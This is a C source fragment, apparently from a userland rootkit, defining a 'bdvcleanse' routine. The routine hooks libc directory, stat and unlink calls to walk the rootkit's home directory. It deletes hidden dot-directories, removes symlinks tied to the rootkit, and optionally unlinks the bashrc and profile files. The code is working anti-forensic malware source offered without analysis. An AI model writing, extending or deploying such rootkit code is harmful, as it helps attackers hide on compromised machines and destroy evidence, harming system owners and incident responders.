void bdvcleanse(void){
    DIR *dp;
    struct dirent *dir;
    int i, lstatstat;
    size_t pathlen;
    struct stat pathstat;

    hook(COPENDIR, CREADDIR, CACCESS, CUNLINK, C__LXSTAT);

    dp = call(COPENDIR, HOMEDIR);
    if(dp == NULL) return; // oh no

    while((dir = call(CREADDIR, dp)) != NULL){
        if(!strcmp(".\0", dir->d_name) || !strcmp("..\0", dir->d_name))
            continue;

        pathlen = LEN_HOMEDIR + strlen(dir->d_name) + 2;
        char path[pathlen];
        snprintf(path, sizeof(path), "%s/%s", HOMEDIR, dir->d_name);

        memset(&pathstat, 0, sizeof(struct stat));
        lstatstat = (long)call(C__LXSTAT, _STAT_VER, path, &pathstat);

        // remove hidden home directories created by various things...
        if(dir->d_name[0] == '.' && S_ISDIR(pathstat.st_mode)){
            eradicatedir(path);
            continue;
        }

        if(lstatstat < 0 || !S_ISLNK(pathstat.st_mode))
            continue;

        for(i = 0; i < LINKSRCS_SIZE; i++)
            if(!strcmp(basename(linkdests[i]), dir->d_name))
                call(CUNLINK, path);
    }
    closedir(dp);
#ifdef ROOTKIT_BASHRC
    call(CUNLINK, BASHRC_PATH);
    call(CUNLINK, PROFILE_PATH);
#endif
}